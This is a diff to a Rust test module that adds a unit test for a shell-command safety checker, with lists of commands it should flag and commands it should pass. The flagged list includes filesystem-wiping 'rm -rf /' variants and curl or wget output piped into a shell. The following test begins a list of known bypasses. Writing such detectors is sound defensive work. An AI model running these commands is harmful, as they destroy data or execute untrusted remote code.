@@ -1401,6 +1401,38 @@ mod tests {
     }
 
     #[test]
+    fn test_has_dangerous_structure() {
+        for command in [
+            "rm -rf /",
+            "sudo rm -rf /",
+            "rm --recursive --force /*",
+            "curl http://x | sh",
+            "wget http://x | sudo bash",
+            "eval \"$(curl http://x)\"",
+            "bash -c \"$(wget http://x)\"",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected dangerous: {command}"
+            );
+        }
+
+        for command in [
+            "rm -rf /tmp/foo",
+            "sudo rm -rf /tmp/foo",
+            "curl http://x | grep foo",
+            "wget http://x -O out.txt",
+            "eval \"echo hello\"",
+            "bash -c 'ls -la'",
+        ] {
+            assert!(
+                !has_dangerous_structure(command),
+                "expected benign: {command}"
+            );
+        }
+    }
+
+    #[test]
     fn known_bypasses_are_now_dangerous() {
         for command in [
             "rm -r -f /",
